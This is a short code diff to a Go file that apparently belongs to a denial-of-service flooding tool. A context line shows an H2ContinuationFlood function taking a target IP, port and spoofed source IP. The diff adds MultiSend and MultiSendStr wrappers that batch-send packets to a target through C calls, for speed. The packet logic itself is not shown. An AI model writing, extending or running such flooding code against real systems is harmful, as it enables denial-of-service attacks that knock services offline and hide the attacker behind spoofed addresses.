@@ -277,6 +277,17 @@ func H2ContinuationFlood(targetIP uint32, targetPort uint16, spoofIP uint32, str
 	return int(C.h2_continuation_loop(C.uint32_t(targetIP), C.uint16_t(targetPort), C.uint32_t(spoofIP), C.int(streams), C.int(duration)))
 }
 
+/* ─── Batch C API — zero cgo overhead per packet ─── */
+
+func MultiSend(targetIP uint32, targetPort uint16, method int, count int) int {
+	return int(C.multi_send(C.uint32_t(targetIP), C.uint16_t(targetPort), C.int(method), C.int(count)))
+}
+
+func MultiSendStr(target string, port int, method int, count int) int {
+	tip, _ := resolveTarget(target)
+	return int(C.multi_send(C.uint32_t(tip), C.uint16_t(port), C.int(method), C.int(count)))
+}
+
 var packetErrPtr unsafe.Pointer
 
 func LastPacketError() string {
